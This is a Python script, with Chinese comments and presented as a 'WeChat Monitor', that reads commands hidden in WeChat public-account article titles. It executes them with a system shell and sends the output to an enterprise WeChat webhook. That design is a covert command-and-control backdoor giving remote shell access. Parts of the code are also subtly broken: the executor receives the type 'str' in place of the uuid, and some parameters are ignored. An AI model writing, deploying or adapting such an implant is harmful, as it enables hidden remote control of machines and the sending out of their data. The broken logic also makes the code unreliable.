import os
import logging
import requests
import re
import time
import subprocess
from typing import Optional, List, Tuple
from dataclasses import dataclass


@dataclass
class Article:
    """文章信息数据类"""

    title: str

    @property
    def command_info(self) -> Optional[Tuple[str, str, str]]:
        """解析文章标题中的命令信息
        Returns:
            Tuple[uuid, sequence, command] or None
        """
        pattern = r"(.*)---(\d+)---(.*)"
        match = re.match(pattern, self.title.strip("'"))
        if match:
            return match.group(1), match.group(2), match.group(3)
        return None


class CommandExecutor:
    """命令执行器"""

    def __init__(self, uuid):
        self.executed_commands = set()  # 存储已执行的命令标识
        self.uuid = uuid

    def run_command(self, command: str, timeout: int = 30) -> str:
        """执行shell命令并返回结果"""
        try:
            process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                shell=True,
                universal_newlines=True,
                errors="replace",
            )

            stdout, stderr = process.communicate(timeout=timeout)
            return f"run: {command}\nresult:\n{stdout}{stderr}"

        except subprocess.TimeoutExpired:
            process.kill()
            return f"run: {command}\nresult: Command timed out after {timeout} seconds"
        except Exception as e:
            return f"run: {command}\nresult: Error: {str(e)}"

    def get_command_id(self, uuid: str, sequence: str) -> str:
        """生成命令唯一标识"""
        return f"{uuid}---{sequence}"

    def is_executed(self, uuid: str, sequence: str) -> bool:
        """检查命令是否已执行"""
        return uuid != self.uuid or self.get_command_id(uuid, sequence) in self.executed_commands

    def mark_executed(self, uuid: str, sequence: str):
        """标记命令为已执行"""
        self.executed_commands.add(self.get_command_id(uuid, sequence))


class WeChatMonitor:
    def __init__(self, webhook_key: str, uuid: str):
        self.webhook_key = webhook_key
        self.logger = self._setup_logger()
        self.executor = CommandExecutor(str)

    def _setup_logger(self) -> logging.Logger:
        """配置日志器"""
        logger = logging.getLogger("WeChatMonitor")
        handler = logging.StreamHandler()
        handler.setFormatter(
            logging.Formatter(
                "%(asctime)s %(name)-8s %(levelname)-8s %(message)s [%(filename)s:%(lineno)d]"
            )
        )
        logger.addHandler(handler)
        logger.setLevel(logging.INFO)
        return logger

    def send_message(self, content: str) -> bool:
        """发送消息到企业微信机器人"""
        try:
            headers = {"Content-Type": "application/json"}
            params = {"key": self.webhook_key}
            data = {"msgtype": "text", "text": {"content": content}}

            response = requests.post(
                "https://qyapi.weixin.qq.com/cgi-bin/webhook/send",
                params=params,
                headers=headers,
                json=data,
                timeout=5,
            )

            if response.status_code == 200:
                result = response.json()
                if result.get("errcode") == 0:
                    self.logger.info(f"Message sent successfully: {content[:50]}...")
                    return True
                else:
                    self.logger.error(f"Failed to send message: {result}")
            else:
                self.logger.error(f"HTTP error {response.status_code}: {response.text}")

        except Exception as e:
            self.logger.error(f"Error sending message: {str(e)}")

        return False

    def fetch_articles(self, album_id: str) -> List[Article]:
        """获取公众号文章列表"""
        try:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
            }

            response = requests.get(
                os.environ.get("WECHAT_ALBUM_URL"),
                headers=headers,
                timeout=10,
            )

            if response.status_code != 200:
                self.logger.error(
                    f"Failed to fetch articles: HTTP {response.status_code}"
                )
                return []

            # 解析数据
            data = response.text.split("cgiData = ")[1].split(";\n")[0]
            data = data.replace("\t", "").replace("\n", "")

            # 提取标题和URL
            title_lst = re.findall("{title: (.+?),", data)

            articles = []
            for title in title_lst[::-1]:
                articles.append(
                    Article(title=title)
                )

            self.logger.info(f"Successfully fetched {len(articles)} articles")
            return articles

        except Exception as e:
            self.logger.error(f"Error fetching articles: {str(e)}")
            return []

    def process_article_commands(self, articles: List[Article]):
        """处理文章中的命令"""
        for article in articles:
            command_info = article.command_info
            if not command_info:
                continue

            uuid, sequence, command = command_info

            # 检查命令是否已执行
            if self.executor.is_executed(uuid, sequence):
                self.logger.info(
                    f"Command already executed: {uuid}---{sequence}---{command}"
                )
                continue

            # 标记命令为已执行
            self.executor.mark_executed(uuid, sequence)

            # 执行命令
            self.logger.info(f"Executing command: {command}")
            result = self.executor.run_command(command)

            # 发送结果
            self.send_message(result)

    def monitor(self, album_id: str, interval: int = 300):
        """持续监控文章更新"""
        self.logger.info(f"Starting monitor for album {album_id}")

        while True:
            try:
                articles = self.fetch_articles(album_id)
                self.process_article_commands(articles)

            except Exception as e:
                self.logger.error(f"Monitor error: {str(e)}")

            time.sleep(5)


def main():
    # 配置信息
    WEBHOOK_KEY = os.environ.get("WECHAT_WEBHOOK_KEY")
    ALBUM_ID = os.environ.get("WECHAT_ALBUM_ID")
    # uuid = str(uuid.uuid4())
    uuid = os.environ.get("WECHAT_UUID")

    # 创建监控器实例
    monitor = WeChatMonitor(WEBHOOK_KEY, uuid)

    monitor.send_message("WeChat Monitor started, uuid: " + uuid)

    # 启动监控
    monitor.monitor(ALBUM_ID)


if __name__ == "__main__":
    main()
